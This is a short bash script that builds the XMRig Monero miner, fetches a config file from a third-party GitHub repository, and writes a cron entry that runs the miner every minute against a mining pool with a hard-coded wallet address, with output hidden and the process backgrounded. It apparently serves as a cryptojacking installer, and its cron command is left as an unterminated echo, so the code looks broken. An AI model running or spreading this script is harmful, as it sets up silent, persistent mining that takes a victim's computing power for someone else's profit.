#!/bin/bash
cd && cd Documents && sudo apt update && sudo apt install git && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && git clone https://github.com/xmrig/xmrig.git && chmod 777 xmrig && cd xmrig && mkdir build && cd build && cmake .. && make -j$(nproc) && wget https://raw.githubusercontent.com/katerin966/0/main/config.json && cd && cd Documents && cd xmrig && echo "*/1 * * * * cd && cd Documents && cd build && ./xmrig -o pool.minexmr.com:443 -u 47fYWmH5mcShArotMMh7vkQF3WmqkWyQr5uES4PPMtonaLZaBdM6MJYCrHC741RV9KRzhvoWirvi6WYhyeWKnRbd2A7uSae -k --tls --rig-id Linux  > /dev/null 2>&1 &
